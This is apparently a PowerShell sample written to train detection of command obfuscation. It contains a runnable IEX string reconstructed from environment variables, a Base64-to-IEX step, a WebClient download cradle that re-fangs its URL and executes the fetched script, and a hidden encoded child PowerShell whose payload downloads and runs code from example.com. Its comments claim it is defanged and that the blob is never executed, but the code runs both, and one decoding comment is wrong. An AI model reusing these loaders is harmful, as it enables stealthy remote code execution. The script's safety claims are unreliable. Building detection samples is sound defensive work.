<#
    Fetch-Config.ps1  (SYNTHETIC / DEFANGED — for detection training only)

    Demonstrates environment-variable-based command string reconstruction
    and encoded/download-cradle patterns under T1027.010 (Command
    Obfuscation). Placeholder domain, defanged indicators, and a harmless
    embedded Base64 payload (decodes to a Write-Host string) — not a live
    payload, not real infrastructure.
#>

# 1. Command string reconstructed from $env: variables instead of a literal
#    cmdlet name — the literal string "Invoke-Expression" never appears.
$env:AA = 'Inv'
$env:BB = 'oke-Expr'
$env:CC = 'ession'
$cmd = $env:AA + $env:BB + $env:CC
& $cmd "Write-Host 'env reconstruction path executed'"

# 2. Variable-splitting via ${...} curly syntax to assemble a string from
#    fragments piecewise.
"${env:AA}${env:BB}${env:CC}" | Out-Null

# 3. Base64-encoded payload decoded and piped straight into Invoke-Expression.
#    (Decodes to: Write-Host "decoded and run")
$b64 = 'V3JpdGUtSG9zdCAiZGVjb2RlZCBhbmQgcnVuIg=='
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64)) | IEX

# 4. Classic download cradle: WebClient pulls a script and pipes it straight
#    into Invoke-Expression without ever writing to disk.
$src = "hxxps://updates-cdn.contoso-corp[.]test/loader.ps1".Replace('hxxps', 'https').Replace('[.]', '.')
(New-Object Net.WebClient).DownloadString($src) | IEX

# 5. Script spawns a hidden child PowerShell process, passing an encoded
#    script block as an argument so the real payload never appears as
#    plaintext in the parent command line or in casual review.
#    (This particular blob decodes to a harmless placeholder download line —
#    it is not executed by this script or by t1027010_hunter.py, which
#    never runs input.)
$encArgs = "-NoP -W Hidden -Enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AYQAiACkA"
Start-Process -FilePath "powershell.exe" -ArgumentList $encArgs -WindowStyle Hidden
